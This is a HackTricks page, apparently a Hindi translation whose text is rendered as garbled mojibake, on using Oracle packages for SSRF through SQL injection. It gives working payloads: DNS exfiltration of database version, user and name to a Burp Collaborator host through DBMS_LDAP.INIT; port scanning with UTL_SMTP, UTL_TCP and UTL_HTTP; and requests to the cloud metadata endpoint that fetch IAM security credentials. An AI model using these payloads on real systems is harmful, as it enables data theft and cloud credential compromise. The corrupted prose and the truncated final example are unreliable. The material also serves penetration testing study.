# рдУрд░реЗрдХрд▓ рдЗрдиреНрдЬреЗрдХреНрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреЛ рдПрдХ рд╡реЗрдмрд╡реЗ рдорд╢реАрди рдХреЙрдкреА рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд░реНрд╡ рдХрд░реЗрдВ рдЬреЛ [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/) рд╕реЗ рд╣рдЯрд╛рдП рдЧрдП рдкреЛрд╕реНрдЯ рд╕реЗ рд╣реИред**

## SSRF

рдУрд░реЗрдХрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ Out of Band HTTP рдФрд░ DNS рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдЪреНрдЫреА рддрд░рд╣ рджрд╕реНрддрд╛рд╡реЗрдЬреАрдХреГрдд рд╣реИ, рд▓реЗрдХрд┐рди рдЗрдиреНрдЬреЗрдХреНрд╢рди рдореЗрдВ SQL рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рдПрдХ рд╕рд╛рдзрди рдХреЗ рд░реВрдк рдореЗрдВред рд╣рдо рд╣рдореЗрд╢рд╛ рдЗрди рддрдХрдиреАрдХреЛрдВ/рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЕрдиреНрдп SSRF/XSPA рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдУрд░реЗрдХрд▓ рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдмрд╣реБрдд рдкреАрдбрд╝рд╛рджрд╛рдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЦрд╛рд╕рдХрд░ рдЕрдЧрд░ рдЖрдк рддреНрд╡рд░рд┐рдд рдЙрджрд╛рд╣рд░рдг рд╕реЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдореЗрд░реЗ рджреЛрд╕реНрдд рдФрд░ рд╕рд╣рдХрд░реНрдореА [Appsecco](https://appsecco.com) рдкрд░, [Abhisek Datta](https://github.com/abhisek), рдиреЗ рдореБрдЭреЗ [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) рдкрд░ рдкрд╣реБрдВрдЪрд╛рдпрд╛ рдЬрд┐рд╕рдиреЗ рдореБрдЭреЗ рдПрдХ t2.large AWS Ubuntu рдорд╢реАрди рдФрд░ рдбреЙрдХрд░ рдкрд░ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреАред

рдореИрдВрдиреЗ `--network="host"` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдбреЙрдХрд░ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдпрд╛ рддрд╛рдХрд┐ рдореИрдВ рдУрд░реЗрдХрд▓ рдХреЛ рдПрдХ рд╕реНрдерд╛рдирд┐рдХ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкреВрд░реНрдг рдиреЗрдЯрд╡рд░реНрдХ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд╕рд╛рде рдирдХрд▓ рдХрд░ рд╕рдХреВрдВ, рдЗрд╕ рдмреНрд▓реЙрдЧрдкреЛрд╕реНрдЯ рдХреЗ рджреМрд░рд╛рдиред
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### рдЙрди Oracle рдкреИрдХреЗрдЬреЗрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ URL рдпрд╛ рд╣реЛрд╕реНрдЯрдирд╛рдо/рдкреЛрд░реНрдЯ рдирдВрдмрд░ рд╡рд┐рдирд┐рд░реНрджрд┐рд╖реНрдЯрд┐ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

рдХрд┐рд╕реА рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ рд╡рд┐рдирд┐рд░реНрджрд┐рд╖реНрдЯрд┐ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдкреИрдХреЗрдЬ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдореИрдВрдиреЗ [Oracle рдбреЗрдЯрд╛рдмреЗрд╕ рдСрдирд▓рд╛рдЗрди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.oracle.com/database/121/index.html) рдкрд░ рдЧреВрдЧрд▓ рдЦреЛрдЬ рдЪрд▓рд╛рдИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
рдЦреЛрдЬ рдиреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рдгрд╛рдо рд╡рд╛рдкрд╕ рдХрд┐рдП (рдмрд╛рд╣рд░реА рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рднреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

рдпрд╣ рдХреНрд░реВрдб рдЦреЛрдЬ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ `DBMS_LDAP` рдЬреИрд╕реЗ рдкреИрдХреЗрдЬреЛрдВ рдХреЛ рдЫреЛрдбрд╝ рджреЗрддреА рд╣реИ (рдЬреЛ рдПрдХ рд╣реЛрд╕реНрдЯрдирд╛рдо рдФрд░ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ) рдХреНрдпреЛрдВрдХрд┐ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреГрд╖реНрда](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) рдЖрдкрдХреЛ рдмрд╕ рдПрдХ [рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рди](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) рдкрд░ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдРрд╕реЗ рдЕрдиреНрдп рдУрд░реЗрдХрд▓ рдкреИрдХреЗрдЬ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд╛рд╣рд░реА рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдореИрдВрдиреЗ рдЫреВрдЯрд╛ рд╕рдХрддрд╛ рд╣реИред

рд╣рд░ рдЧрддрд┐, рдЪрд▓реЛ рд╣рдо рдХреБрдЫ рдкреИрдХреЗрдЬреЛрдВ рдкрд░ рдПрдХ рдирдЬрд╝рд░ рдбрд╛рд▓рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдордиреЗ рдЦреЛрдЬрд╛ рдФрд░ рдКрдкрд░ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдпрд╛ рд╣реИред

**DBMS\_LDAP.INIT**

`DBMS_LDAP` рдкреИрдХреЗрдЬ LDAP рд╕рд░реНрд╡рд░ рд╕реЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред `init()` рдлрд╝рдВрдХреНрд╢рди рдПрдХ LDAP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рд╕рддреНрд░ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╣реЛрд╕реНрдЯрдирд╛рдо рдФрд░ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рдПрдХ рддрд░реНрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЗрддрд╛ рд╣реИред

рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдбреЛрдХреНрдпреВрдореЗрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рдбреЗрдЯрд╛ рдХреЛ DNS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬреИрд╕реЗ рдХрд┐ рдиреАрдЪреЗ
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрд╕реНрдЯрдирд╛рдо рдФрд░ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рддрд░реНрдХ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд░ рдХреА рддрд░рд╣ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣рд╛рдБ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рд╣реИрдВ
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
`ORA-31203: DBMS_LDAP: PL/SQL - рдкреНрд░рд╛рд░рдВрднрд┐рдд рд╡рд┐рдлрд▓ рд╣реБрдЖ.` рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ рдЬрдмрдХрд┐ рдПрдХ рд╕рддреНрд░ рдорд╛рди рдЦреБрд▓реЗ рдкреЛрд░реНрдЯ рдХреА рдУрд░ рдкреЛрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИред

**UTL\_SMTP**

`UTL_SMTP` рдкреИрдХреЗрдЬ рдХреЛ SMTP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред [рдУрд░реЗрдХрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЗрдЯ рдкрд░ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕ рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478)ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╣рдорд╛рд░реЗ рд▓рд┐рдП, рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рд╣реИ рд╣реЛрд╕реНрдЯ рдФрд░ рдкреЛрд░реНрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рдеред

рдПрдХ рдХрдЪреНрдЪрд╛ рдЙрджрд╛рд╣рд░рдг рдиреАрдЪреЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ `UTL_SMTP.OPEN_CONNECTION` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде, рдЬрд┐рд╕рдореЗрдВ 2 рд╕реЗрдХрдВрдб рдХрд╛ рд╕рдордп рд╕реАрдорд╛ рд╣реИред
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
`ORA-29276: рдЯреНрд░рд╛рдВрд╕рдлрд░ рд╕рдордп рд╕рдорд╛рдкреНрдд` рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИ рд▓реЗрдХрд┐рди рдХреЛрдИ SMTP рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реБрдЖ рдЬрдмрдХрд┐ `ORA-29278: SMTP рдЕрд╕реНрдерд╛рдпреА рддреНрд░реБрдЯрд┐: 421 рд╕реЗрд╡рд╛ рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ` рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИред

**UTL\_TCP**

`UTL_TCP` рдкреИрдХреЗрдЬ рдФрд░ рдЗрд╕рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде [TCP/IP рдЖрдзрд╛рд░рд┐рдд рд╕рдВрдЪрд╛рд░ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВ](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ред рдпрджрд┐ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдкреИрдХреЗрдЬ рдЖрд╕рд╛рдиреА рд╕реЗ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдкреНрд░рд╡реЗрд╢ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдмрди рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рд╕рднреА рдкрд╣рд▓реВ рдПрдХ TCP/IP рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдкреВрд░рд╛ рдирд┐рдпрдВрддреНрд░рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг [рдСрд░реЗрдХрд▓ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рд╛рдЗрдЯ рдкрд░ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдХреИрд╕реЗ рдЗрд╕ рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд░реЙ TCP рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рд╡реЗрдм рдкреЗрдЬ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВ](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190)ред рд╣рдо рдЗрд╕реЗ рдФрд░ рднреА рд╕рд░рд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдорд┐рдЯрд╛рдХрд░ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдпрд╛ рдХрд┐рд╕реА рднреА рдРрддрд┐рд╣рд╛рд╕рд┐рдХ TCP/IP рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
**UTL\_HTTP рдФрд░ рд╡реЗрдм рдЕрдиреБрд░реЛрдз**

рд╢рд╛рдпрдж рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рдФрд░ рд╡реНрдпрд╛рдкрдХ рддрдХрдиреАрдХ рдЬреЛ рд╣рд░ Out of Band Oracle SQL Injection рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреА рдЧрдИ рд╣реИ, рд╡рд╣ рд╣реИ [`UTL_HTTP` рдкреИрдХреЗрдЬ](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070)ред рдЗрд╕ рдкреИрдХреЗрдЬ рдХреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рджреНрд╡рд╛рд░рд╛ `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.` рдХреЗ рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдкреНрд░рд╛рдердорд┐рдХ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд┐рдВрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
`ORA-12541: TNS:no listener` рдпрд╛ `TNS:operation timed out` рдПрдХ рд╕рдВрдХреЗрдд рд╣реИ рдХрд┐ TCP рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ, рдЬрдмрдХрд┐ `ORA-29263: HTTP protocol error` рдпрд╛ рдбреЗрдЯрд╛ рдПрдХ рд╕рдВрдХреЗрдд рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИред

рдореИрдВрдиреЗ рдкрд┐рдЫрд▓реЗ рдореЗрдВ рдПрдХ рдЕрдиреНрдп рдкреИрдХреЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рднрд┐рдиреНрди рд╕рдлрд▓рддрд╛ рдереА, рд╡рд╣ рд╣реИ [`GETCLOB()` рдореЗрдердб рдХрд╛ `HTTPURITYPE` рдУрд░реЗрдХрд▓ рдЕрдмрд╕реНрдЯреНрд░реИрдХреНрдЯ рдЯрд╛рдЗрдк](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705) рдЬреЛ рдЖрдкрдХреЛ рдПрдХ URL рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдФрд░ HTTP рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдерди рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред `GETCLOB()` рдореЗрдердб рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ URL рд╕реЗ GET рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ [CLOB рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред [select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
